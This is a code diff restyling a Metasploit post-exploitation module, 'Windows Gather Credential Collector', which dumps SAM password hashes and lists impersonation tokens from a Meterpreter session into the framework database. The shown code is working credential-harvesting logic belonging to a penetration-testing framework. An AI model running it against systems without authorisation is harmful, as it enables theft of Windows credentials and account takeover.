@@ -3,21 +3,29 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core/auxiliary/report'
-
 class MetasploitModule < Msf::Post
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Windows Gather Credential Collector',
-        'Description'   => %q{ This module harvests credentials found on the host and stores them in the database.},
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'tebo[at]attackresearch.com'],
-        'Platform'      => [ 'win' ],
-        'SessionTypes'  => [ 'meterpreter']
-      ))
-
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather Credential Collector',
+        'Description' => %q{ This module harvests credentials found on the host and stores them in the database.},
+        'License' => MSF_LICENSE,
+        'Author' => [ 'tebo[at]attackresearch.com'],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter'],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              incognito_list_tokens
+              priv_passwd_get_sam_hashes
+            ]
+          }
+        }
+      )
+    )
   end
 
   # Run Method for when run command is issued
@@ -31,13 +39,13 @@ class MetasploitModule < Msf::Post
     end
 
     # Make sure we're rockin Priv and Incognito
-    session.core.use("priv") if not session.priv
-    session.core.use("incognito") if not session.incognito
+    session.core.use('priv') if !session.priv
+    session.core.use('incognito') if !session.incognito
 
     # It wasn't me mom! Stinko did it!
     begin
       hashes = client.priv.sam_hashes
-    rescue
+    rescue StandardError
       print_error('Error accessing hashes, did you migrate to a process that matched the target\'s architecture?')
       return
     end
@@ -47,7 +55,7 @@ class MetasploitModule < Msf::Post
     # client.framework.db.report_host(:host => addr, :state => Msf::HostState::Alive)
 
     # Record hashes to the running db instance
-    print_good "Collecting hashes..."
+    print_good 'Collecting hashes...'
 
     hashes.each do |hash|
       # Build service information
@@ -55,16 +63,16 @@ class MetasploitModule < Msf::Post
         address: addr,
         port: 445,
         service_name: 'smb',
-        protocol: 'tcp',
+        protocol: 'tcp'
       }
 
       # Build credential information
       credential_data = {
         origin_type: :session,
         session_id: session_db_id,
-        post_reference_name: self.refname,
+        post_reference_name: refname,
         private_type: :ntlm_hash,
-        private_data: hash.lanman + ":" + hash.ntlm,
+        private_data: hash.lanman + ':' + hash.ntlm,
         username: hash.user_name,
         workspace_id: myworkspace_id
       }
@@ -87,16 +95,16 @@ class MetasploitModule < Msf::Post
 
     # Record user tokens
     tokens = session.incognito.incognito_list_tokens(0)
-    raise Rex::Script::Completed if not tokens
+    raise Rex::Script::Completed if !tokens
 
     # Meh, tokens come to us as a formatted string
-    print_good "Collecting tokens..."
-    (tokens["delegation"] + tokens["impersonation"]).split("\n").each do |token|
+    print_good 'Collecting tokens...'
+    (tokens['delegation'] + tokens['impersonation']).split("\n").each do |token|
       data = {}
-      data[:host]      = addr
-      data[:type]      = 'smb_token'
-      data[:data]      = token
-      data[:update]    = :unique_data
+      data[:host] = addr
+      data[:type] = 'smb_token'
+      data[:data] = token
+      data[:update] = :unique_data
 
       print_line "    #{data[:data]}"
       report_note(data) if db_ok
